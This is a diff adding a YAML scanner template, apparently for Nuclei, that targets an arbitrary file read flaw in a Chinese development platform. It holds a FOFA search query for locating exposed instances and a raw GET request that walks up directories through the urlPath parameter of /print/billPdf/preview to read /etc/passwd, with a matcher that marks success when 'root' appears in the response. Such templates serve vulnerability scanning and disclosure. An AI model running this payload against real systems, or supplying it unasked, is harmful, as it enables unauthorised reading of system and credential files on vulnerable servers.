@@ -1,0 +1,32 @@
+id: Znk-preview-fileread
+
+info:
+  name: 真内控国产化开发平台 preview 任意文件读取
+  author: god
+  severity: high
+  description: 真内控国产化开发平台 preview 任意文件读取
+  metadata:
+    fofa-query: body="js/npm.echarts.js"
+  tags: znk,fileread
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /print/billPdf/preview?urlPath=../../../../../../../../../../../../../../etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
+    Accept: application/json, text/javascript, */*; q=0.01
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Connection: close
+
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - root
+      condition: and
